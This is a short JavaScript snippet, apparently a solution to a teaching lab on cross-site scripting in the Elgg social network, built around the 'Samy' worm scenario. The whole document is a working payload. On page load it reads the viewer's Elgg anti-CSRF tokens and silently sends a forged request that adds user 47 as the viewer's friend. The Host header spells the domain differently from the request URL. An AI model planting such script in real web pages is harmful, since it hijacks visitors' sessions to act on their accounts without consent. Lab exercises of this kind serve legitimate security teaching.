<script type="text/javascript">
window.onload = function() {
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

	// Constructs the HTTP request to add Samy as a friend.
	var send_url = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;

	// Creates the AJAX request to add friend.
	Ajax = new XMLHttpRequest();
	Ajax.open("GET", send_url, true);
	Ajax.setRequestHeader("Host", "www.xsslabegg.com");
	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	Ajax.send();
}
</script>
